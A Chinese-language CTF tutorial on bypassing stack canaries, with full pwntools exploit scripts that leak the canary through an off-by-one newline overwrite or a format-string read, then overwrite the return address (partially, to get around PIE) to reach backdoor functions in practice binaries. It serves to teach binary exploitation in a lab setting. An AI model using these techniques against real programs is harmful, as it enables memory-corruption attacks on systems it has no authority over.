    这是本系列的第二篇文章，介绍了如何将Canary的值泄露出来，因为Canary保护机制会在函数返回的时候检查Canary的值有无变化，因此我们后续溢出的时候记得在对应位置上把具体Canary的值填回去，以不至于Canary的值被我们的垃圾数据填充掉而触发报警结束程序，这么做便可以绕过机制，正常溢出覆盖返回地址。

    思路一：

    有些程序会把我们输入的数据赋给x变量，然后又再次把x变量的值打印出来。
    最常见的是打印欢迎词。例如《第二届浙江省网安竞赛初赛-uninit》里面一样。

    我们利用读入x变量，正好溢出到canary的位置，然后输出printf的时候就可以把canary的值当做x变量的一部分进行输出，泄露Canary的值。

    大致exp如下：

    r.recvuntil("Hello radish!n")
r.sendline("a"*100)
r.recvuntil("a"*100)
canary = u32(r.recv(4))-0x0a     #泄露出Canary的值
log.info("canary:"+hex(canary))

payload =  "a"*100     #填充
payload += p32(canary)    #把泄露的canary值填回去（rbp-0x8）
payload += "a"*8      #随便填    
payload += "aaaa"     #ebp位置
payload += p32(shell_addr)    # 覆盖返回地址
r.sendline(payload)

    相关解释：
    注意第三行我们是使用sendline()发送数据，sendline()会自动在数据最后加上 “\n”，即换行符\x0a，所以 “\x0a”作为多出来的一字节将会把Canary的低字节给覆盖掉。
    记得我们在开篇介绍里讲过Canary，它的低字节总是以”\x00”结尾，由于是小端序，所以将\x00放在前面，目的就是为了截断打印。但是现在\x00被覆盖为了\x0a，所以将持续输出导致Canary的值也给输出来了。我们要做的就是接收它。接收的4字节数据的低字节还是”\x0a”，所以我们再减去”\x0a”便是”\x00”,现在这4字节就是Canary的值了。最后构造payload时找准位置将Canary填回去就可了。

    *例题（/Bypass-Canary/babypie）：

    buf栈的大小是0x30（40字节），再加上Canary，所以说虽然栈空间开了48字节，但是我们能写入的只有40字节，剩下的8字节是用来存Canary的。 存在off by one漏洞。

    看图应该能理解：

    直接贴上exp，我在exp里解释的很详细了，包括程序调试结果。

    exp：

    #coding=utf-8
from pwn import *
io=process('./babypie')
context.log_level='debug'
io.sendline('a'*40)
gdb.attach(io,'')
#输入 stack 查看栈数据
#发现 0008| 0x7ffd3bbfd4b0 ('a' <repeats 40 times>, "\n\224\342kLG\367\025")
#0x7ffd3bbfd4b0这个地址应该就是我们的输入，写的很清楚，'a'有40次

# gdb-peda$ x/20xg 0x7ffd3bbfd4b0
# 0x7ffd3bbfd4b0:    0x6161616161616161    0x6161616161616161
# 0x7ffd3bbfd4c0:    0x6161616161616161    0x6161616161616161
# 0x7ffd3bbfd4d0:    0x6161616161616161    0x15f7474c6be2940a

#于是填入40字节的a，多出来的 \x0a 把Canary的低字节给覆盖了！
io.recvuntil("\x0a")
io.recvuntil("\x0a")
#至于这里为什么是有两个recvuntil("\x0a")
#解释：调试一遍就知道了
#返回的数据是：
# [DEBUG] Received 0x4f bytes:
#     00000000  49 6e 70 75  74 20 79 6f  75 72 20 4e  61 6d 65 3a  │Inpu│t yo│ur N│ame:│
#     00000010  0a 48 65 6c  6c 6f 20 61  61 61 61 61  61 61 61 61  │·Hel│lo a│aaaa│aaaa│
#     00000020  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
#     00000030  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 0a  │aaaa│aaaa│aaaa│aaa·│
#     00000040  84 2e f4 09  9f 59 ea 30  b0 01 a7 ff  7f 3a 0a     │·.··│·Y·0│····│·:·│
#     0000004f
#可见全文有3个0a，我们需要的是第二个0a后面的7个字节数据，所以自然要写两遍recvuntil("\x0a")啦。

canary=u64(io.recv(7).rjust(8,'\x00'))
#rjust，意为将该不满8字节的地址从低字节开始填充00，填满8字节。
print hex(canary)

# gdb.attach(io,'')
payload2='a'*40+p64(canary)+p64(0xdeadbeef)+p8(0x3e)
#这里的p8很有灵性，只修改一个字节。
io.send(payload2)
io.interactive()

    有一点我要拿出来讲。由于本题程序偏移0xa3e的位置是有后门函数的，所以我们在构造payload时将返回地址覆盖为后门函数。但是由于存在PIE保护机制，后门函数的完整实际内存地址我们又不知道。所以就只修改低字节.
    我调试的时候看过了，算了，贴上调试过程解释起来更清楚一点：

    0x7fffa701afe0:    0x6161616161616161    0x6161616161616161
0x7fffa701aff0:    0x6161616161616161    0x6161616161616161
0x7fffa701b000:    0x6161616161616161    0xea599f09f42e840a  <==Canary值
0x7fffa701b010:    0x00007fffa701b030    0x000055e225e16a6a  <==返回地址

    可以看到40字节的垃圾数据。多出来的”0a”把Canary低字节给覆盖了。所以Canary真正的值应为0xea599f09f42e8400。接下来8字节是rbp，再接下去8字节（0x7fffa701b018的位置）就是我们的返回地址了。我们发现低2字节为 6a6a （这么写虽然不规范，但是为了方便两者比较） 而我们的后门函数的偏移（低字节）为 a3e，怎么样，是不是就只需要修改最后1字节就好了呢。

    神奇吧。我一开始做到这题的时候就惊呼：涨知识了。使用p8()只修改1字节即可令返回地址整个地址变成后门函数的地址。因此可以忽略PIE带给我们的限制。

    看来本题的关键字是 低字节 没错了。

    思路二：

    由于Linux对格式化字符的限制很少，导致格式化字符可以大肆利用，有时也是可以作为一种思路进行利用。

    而这里我们利用格式化漏洞，算好偏移地址，泄露出canary的地址。

    *例题（/Bypass-Canary/bin0）：

    main函数存在格式化字符串漏洞，漏洞代码如下：

    __isoc99_scanf(“%6s”, &format);
    printf(&format);

    另外在 fun()函数中发现了栈溢出：

    char buf; // [esp+8h] [ebp-70h]
    …..
    read(0, &buf, 0x78u);

    重点分析main函数中Canary的有关代码：

    mov     eax, 0
mov     edx, [ebp+var_C]
xor     edx, large gs:14h
jz      short loc_804878A

    看来Canary的值被放入到了 Var_C 变量里。我们直接点击Var_C 跟着来到栈里查看分布。
    如下：

    format变量存放着我们的输入，而本题存在格式化字符串漏洞。所以我们就能先计算出format和Var_C之间的偏移为7，然后通过格式化字符 %7$x 偏移7泄露Canary的值。

    exp：

    #coding=utf-8
from pwn import *
p=process('./bin')
leak='%7$x'    #直接看栈，format到var_c的距离为7
p.sendline(leak)
canary_addr=int(p.recv(),16)
getflag=0x0804863B  #后门函数
payload='a'*(0x70-0xc)+p32(canary_addr)+'a'*12+p32(getflag)
p.sendline(payload)
p.interactive()

    总结：

    思路一是通过sendline()发送满栈数据， off by one，刚好溢出的1字节覆盖canary的低字节00为0a，令printf持续输出泄露canary的值。

    思路二是通过格式化字符串漏洞泄露，格式化字符串只要利用的好，就可以泄露任意地址，以及任意地址写入。
